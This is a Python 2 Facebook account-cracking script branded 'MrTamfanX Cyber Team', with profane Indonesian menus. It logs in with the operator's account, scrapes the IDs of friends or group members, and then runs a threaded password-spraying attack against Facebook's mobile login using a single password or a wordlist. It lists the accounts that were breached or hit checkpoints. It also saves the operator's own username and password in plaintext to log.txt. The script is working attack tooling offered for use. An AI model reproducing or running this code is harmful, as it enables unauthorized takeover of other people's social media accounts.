from __future__ import print_function
import platform, os, smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
W  = '\033[0m'  # white (default)
R  = '\033[1;31m' # red
G  = '\033[1;32m' # green bold
O  = '\033[1;33m' # orange
B  = '\033[1;34m' # blue
P  = '\033[1;35m' # purple
C  = '\033[1;36m' # cyan
GR = '\033[1;37m' # gray

def about():
    print ('')
    print (G+'[Root@'+O+'MrTamfanX]'+W)
    print ('')
    print ('Kami segenap anggota team MrTamfanX Cyber Team Mengucapkan Ngentod Kepada Kalian.')
    print ('')
    print (G+'[Root@'+O+'MrTamfanX] Cara Gunakan'+W)
    print ('')
    print ('''Pilih menu
Masukkan Password yang akan di Crack
Selesai''')
    print ('')
    print (G+'[Root@'+O+'MrTamfanX] Apa Itu Pembaruan'+W)
    print ('')
    print ('''Admin Tamfan Adalah Yang Pembuat Script Ini Dia Orangnya Ramah
Dan Dia Admin TerTamfan Di Grup MrTamfanX sad sangat Dan Dia Juga Mempunyai Sebuah
Website:https://tutoriatermuxmrtamfanx.blogspot.com/2019/05/selamat-datang-kembali-di-website.html?m=1
Author:MrTamfanX || MyTeam:MrTamfanXCyberTeam || Youtube:MrTamfanX Cyber Team
''')
    ans='Y'
    ans=str(raw_input(G+'[Root@'+O+'MrTamfanX] Lanjutkan (Y/N)?\n'+G+'[+]==>> '))
    if ans=='y'or ans=='Y':
        menu()
    elif ans=='n'or ans=='N':
        exit()
    else:
        exit()


def tampil(x):
	w = {'m':31,'h':32,'k':33,'b':34,'p':35,'c':36}
	for i in w:
		x=x.replace('\r%s'%i,'\033[%s;1m'%w[i])
	x+='\033[0m'
	x=x.replace('\r0','\033[0m')
	print(x)
if platform.python_version().split('.')[0] != '2':
	tampil('[Root@MrTamfanX][!]kamu menggunakan python versi %s silahkan menggunakan versi 2.x.x'%v().split(' ')[0])
	os.sys.exit()
import cookielib,re,urllib2,urllib,threading
try:
	import mechanize
except ImportError:
	tampil('[Root@MrTamfanX][!] SepertiNya Module \rcmechanize\rm belum di install...')
	os.sys.exit()
def keluar():
	simpan()
	tampil('[Root@MrTamfanX] Keluar')
	os.sys.exit()
log = 0
id_bteman = []
id_bgroup = []
fid_bteman = []
fid_bgroup = []
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_cookiejar(cookielib.LWPCookieJar())
br.set_handle_redirect(True)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
def bacaData():
	global fid_bgroup,fid_bteman
	try:
		fid_bgroup = open(os.sys.path[0]+'/MrTamfanXCyberTeam.txt','r').readlines()
	except:pass
	try:
		fid_bteman = open(os.sys.path[0]+'/MrTamfanXCyberTeam.txt','r').readlines()
	except:pass
def inputD(x,v=0):
	while 1:
		try:
			a = raw_input('\x1b[32;1m%s\x1b[31;1m:\x1b[33;1m'%x)
		except:
			tampil('[Root@MrTamfanX] Batal')
			keluar()
		if v:
			if a.upper() in v:
				break
			else:
				tampil('[Root@MrTamfamX] Pilih Opsinya Ngentod')
				continue
		else:
			if len(a) == 0:
				tampil('[Root@MrTamfanX] Masukin Yang Bener Ngentod')
				continue
			else:
				break
	return a
def inputM(x,d):
	while 1:
		try:
			i = int(inputD(x))
		except:
			tampil('[Root@MrTamfanX] Yang Lu Cari Kaga Ada Ngentod')
			continue
		if i in d:
			break
		else:
			tampil('Root@MrTamfanX] Yang Lu Cari Kaga Ada Ngentod')
	return i

def simpan():
	if len(id_bgroup) != 0:
		tampil('[Root@MrTamfanX] Saving \rcMrTamfanXCyberTeam.txt...')
		try:
			open(os.sys.path[0]+'/MrTamfanXCyberTeam.txt','w').write('\n'.join(id_bgroup))
			tampil('[Root@MrTamfanX] TersimpanNgentod!!')
		except:
			tampil('[Root@MrTamfanX] Gagal Ngentod!!')
	if len(id_bteman) != 0:
		tampil('[Root@MrTamfanX]MrTamfanXCyberTeam.txt')
		try:
			open(os.sys.path[0]+'/MrTamfanXCyberTeam.txt','w').write('\n'.join(id_bteman))
			tampil('[Root@MrTamfanX] TersimpanNgentod!!')
		except:
			tampil('[Root@MrTamfanX] Gagal Ngentod!!')
def buka(d):
	tampil('[Root@MrTamfanX] Proses Ngentod \rp'+d+'...')
	try:
		x = br.open(d)
		br._factory.is_html = True
		x = x.read()
	except:
		tampil('[Root@MrTamfanX} Proses Ngentod \rp'+d+' >> Gagal Ngentod!!')
		keluar()
	if '<link rel="redirect" href="' in x:
		return buka(br.find_link().url)
	else:
		return x
def login():
	global log
	us = inputD('[?][Root@MrTamfanX] Log-in Ngentod?')
	pa = inputD('[?][Root@MrTamfanX] Pass Ngentod?')
	tampil('\n\rh[TungguNgentod....')
	buka('https://m.facebook.com')
	br.select_form(nr=0)
	br.form['email']=us
	br.form['pass']=pa
	br.submit()
	url = br.geturl()
	if 'save-device' in url or 'm_sess' in url:
		tampil('\rh[Root@MrTamfanX] Login Succes Ngentod!!')
		buka('https://mobile.facebook.com/home.php')
		nama = br.find_link(url_regex='logout.php').text
		nama = re.findall(r'\((.*a?)\)',nama)[0]
		tampil('\rh[Root@MrTamfanX] Selamat Datang Hacker Kontol \rk%s\n'%nama)
		log = 1
		z = open("log.txt","w")
		z.write("USERNAME : ")
		z.write(us)
		z.write("\n")
		z.write(" PASSWORD : ")
		z.write(pa)
		z.close()
	elif 'checkpoint' in url:
		tampil('\rm[!][Root@MrTamfanX] Akun Lu Kena Check Point Ngentod \n\rk[!][Root@MrTamfanX] Ngentod Dulu Sana')
		keluar()
	else:
		tampil('\rm[!]Login Gagal')
def saring_id_teman(r):
	for i in re.findall(r'/friends/hovercard/mbasic/\?uid=(.*?)&',r):
		id_bteman.append(i)
		tampil('\rc==>\rb%s\rm'%i)
def saring_id_group1(d):
	for i in re.findall(r'<h3><a href="/(.*?)fref=pb',d):
		if i.find('profile.php') == -1:
			a = i.replace('?','')
		else:
			a = i.replace('profile.php?id=','').replace('&amp;','')
		if a not in id_bgroup:
			tampil('\rk==>\rc%s'%a)
			id_bgroup.append(a)
def saring_id_group0():
	global id_group
	while 1:
		id_group = inputD('[?]Id Group')
		tampil('\rh[*][Root@MrTamfanX] Mengecek Group....')
		a = buka('https://m.facebook.com/browse/group/members/?id='+id_group+'&amp;start=0&amp;listType=list_nonfriend&amp;refid=18&amp;_rdc=1&amp;_rdr')
		nama = ' '.join(re.findall(r'<title>(.*?)</title>',a)[0].split()[1:])
		try:
			next = br.find_link(url_regex= '/browse/group/members/').url
			break
		except:
			tampil('\rm[!][Root@MrTamfanX] Kadaluarsa Ngentod!!')
			continue
	tampil('\rh[*][Root@MrTamfanX] Mengambil Id dari group \rc%s'%nama)
	saring_id_group1(a)
	return next
def idgroup():
	if log != 1:
		tampil('\rh[*][Root@MrTamfanX] Login Dulu Ngentod')
		login()
		if log == 0:
			keluar()
	next = saring_id_group0()
	while 1:
		saring_id_group1(buka(next))
		try:
			next = br.find_link(url_regex= '/browse/group/members/').url
		except:
			tampil('\rm[!][Root@MrTamfanX] Hanya Segitu Doang Ngentodnya \rh %d id'%len(id_bgroup))
			break
	simpan()
	i = inputD('[?][Root@MrTamfanX] Ngentod Lagi? (y/t)',['Y','T'])
	if i.upper() == 'Y':
		return crack(id_bgroup)
	else:
		return menu()
def idteman():
	if log != 1:
		tampil('\rh[*][Root@MrTamfanX] Login Dulu Ngentod')
		login()
		if log == 0:
			keluar()
	saring_id_teman(buka('https://m.facebook.com/friends/center/friends/?fb_ref=fbm&ref_component=mbasic_bookmark&ref_page=XMenuController'))
	try:
		next = br.find_link(url_regex= 'friends_center_main').url
	except:
		if len(id_teman) != 0:
			tampil('\rm[!][Root@MrTamfanX] Hanya Segitu Ngentod \rp%d id'%len(id_bteman))
		else:
			tampil('\rm[!][Root@MrTamfanX] Batal')
			keluar()
	while 1:
		saring_id_teman(buka(next))
		try:
			next = br.find_link(url_regex= 'friends_center_main').url
		except:
			tampil('\rm[!][Root@MrTamfamX] Hanya Segitu Ngentod \rp%d id'%len(id_bteman))
			break
	simpan()
	i = inputD('[?][Root@MrTamfanX] Ngentod Lagi? (y/t)',['Y','T'])
	if i.upper() == 'Y':
		return crack(id_bteman)
	else:
		return menu()
class mt(threading.Thread):
    def __init__(self,i,p):
        threading.Thread.__init__(self)
        self.id = i
        self.a = 3
        self.p = p
    def update(self):
        return self.a,self.id
    def run(self):
        try:
             data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}))
        except KeyboardInterrupt:
            os.sys.exit()
        except:
            self.a = 8
            os.sys.exit()
        if 'm_sess' in data.url or 'save-device' in data.url:
            self.a = 1
        elif 'checkpoint' in data.url:
            self.a = 2
        else:
            self.a = 0
def crack(d):
	i = inputD('[?][Root@MrTamfanX] Pakai Passwordlist/Manual (p/m)',['P','M'])
	if i.upper() == 'P':
		while 1:
			dir = inputD('[?][Root@MrTamfanX] Input namafile >>')
			try:
				D = open(dir,'r').readlines()
			except:
				tampil('\rm[!][Root@MrTamfamX] Gagal Ngentod!! \rk%s'%dir)
				continue
			break
		tampil('\rh[*][Root@MrTamfanX] Lagi Di Crack Ngentod \rk%d password'%len(D))
		for i in D:
			i = i.replace('\n','')
			if len(i) != 0:
				crack0(d,i,0)
		i = inputD('[?][Root@MrTamfanX] Coba Lagi Ngentod?? (y/t)',['Y','T'])
		if i.upper() == 'Y':
			return crack(d)
		else:
			return menu()
	else:
		return crack0(d,inputD('[?][Root@MrTamfanX] Input Passwd '),1)
def crack0(data,sandi,p):
	tampil('\rh[*][Root@MrTamfanX] Crack \rk%d Acc \rhWith \rm[\rk%s\rm]'%(len(data),sandi))
	print('\033[32;1m[*]Root@MrTamfanX] Cracking \033[31;1m[\033[36;1m0%\033[31;1m]\033[0m',end='')
	os.sys.stdout.flush()
	akun_jml = []
	akun_sukses = []
	akun_cekpoint = []
	akun_error = []
	akun_gagal = []
	jml0,jml1 = 0,0
	th = []
	for i in data:
		i = i.replace(' ','')
		if len(i) != 0:th.append(mt(i,sandi))
	for i in th:
		jml1 += 1
		i.daemon = True
		try:i.start()
		except KeyboardInterrupt:exit()
	while 1:
		try:
			for i in th:
				a = i.update()
				if a[0] != 3 and a[1] not in akun_jml:
					jml0 += 1
					if a[0] == 2:
						akun_cekpoint.append(a[1])
					elif a[0] == 1:
						akun_sukses.append(a[1])
					elif a[0] == 0:
						akun_gagal.append(a[1])
					elif a[0] == 8:
						akun_error.append(a[1])
					print('\r\033[32;1m[*]Root@MrTamfanX] Cracking \033[31;1m[\033[36;1m%0.2f%s\033[31;1m]\033[0m'%(float((float(jml0)/float(jml1))*100),'%'),end='')
					os.sys.stdout.flush()
					akun_jml.append(a[1])
		except KeyboardInterrupt:
			os.sys.exit()
		try:
			if threading.activeCount() == 1:break
		except KeyboardInterrupt:
			keluar()
	print('\r\033[32;1m[*][Root@MrTamfanX] Cracking \033[31;1m[\033[36;1m100%\033[31;1m]\033[0m     ')
	if len(akun_sukses) != 0:
		tampil('\rh[*][Root@MrTamfanX] Yes Ngecrot!!')
		for i in akun_sukses:
			tampil('\rh[Root@MrTamfanX]\rk%s \rm[\rp%s\rm]'%(i,sandi))
	tampil('\rh[*][Root@MrTamfanX] Yes Ngecrot\rp      %d'%len(akun_sukses))
	tampil('\rm[*][Root@MrTamfanX] Gagal Ngentod\rp         %d'%len(akun_gagal))
	tampil('\rk[*][Root@MrTamfanX] CheckPoint Ngentod\rp      %d'%len(akun_cekpoint))
	tampil('\rc[*][Root@MrTamfanX] Rusak Ngentod\rp         %d'%len(akun_error))
	if p:
		i = inputD('[?][Root@MrTamfanX] Coba Ngentod Lagi? (y/t)',['Y','T'])
		if i.upper() == 'Y':
			return crack(data)
		else:
			return menu()
	else:
		return 0
def lanjutT():
	global fid_bteman
	if len(fid_bteman) != 0:
		i = inputD('[?]Riset Hasil Id Teman/lanjutkan (r/l)',['R','L'])
		if i.upper() == 'L':
			return crack(fid_bteman)
		else:
			os.remove(os.sys.path[0]+'/MrTamfanXCyberTeambteman.txt')
			fid_bteman = []
	return 0
def lanjutG():
	global fid_bgroup
	if len(fid_bgroup) != 0:
		i = inputD('[?]Riset Hasil Id Group/lanjutkan (r/l)',['R','L'])
		if i.upper() == 'L':
			return crack(fid_bgroup)
		else:
			os.remove(os.sys.path[0]+'/MrTamfanXCyberTeambgroup.txt')
			fid_bgroup = []
	return 0
def menu():
	tampil('''\rc
[+]=======================================================[+]
[+]Selamat Datang Di Script Facebook MrTamfanX Cyber Team [+]
[+]Jangan Lupa Subscribe Chanel Kami Jangan Sampai TidakYa[+]
[+]Dan Jangan Lupa Di Share Juga KeTeman Teman Kalian Ya  [+]
[+]=======================================================[+]''')
	tampil('''\rc
\rc[+]==================================================[+]
\rc[-]Selamat Datang Jangan Lupa Subscribe MrTamfanX Ya [+]
\rk[-]Author   : MrTamfanXCyberTeam || $UB$CR1B3 || L1K3[+]
\rk[-]Contact : MrTamfanXCyberTeam@Gmail.com || L1K3    [+]
\rc[+]==================================================[+]
\rc[+]Pilihan Menu Ada 1.Ambil Facebook Teman Kalian    [+] 
\rc[+]Pilihan Menu Ada 2.Ambil Facebook Group Kalian    [+] 
\rc[+]Pilihan Menu Ada 3.Infomasi Tentang Admin Tamfan  [+] 
\rc[+]Pilihan Menu Ada 4.Keluar Dan Sudah Selesai Sadap [+] 
\rc[+]==================================================[+]
	''')
	i = inputM('[?][Root@MrTamfanX] Masukin Nomernya Ngentod',[1,2,3,4])
	if i == 1:
		lanjutT()
		idteman()
		
	elif i == 2:
		lanjutG()
		idgroup()

	elif i == 3:
		about()

	elif i == 4:
		keluar()

bacaData()
menu()
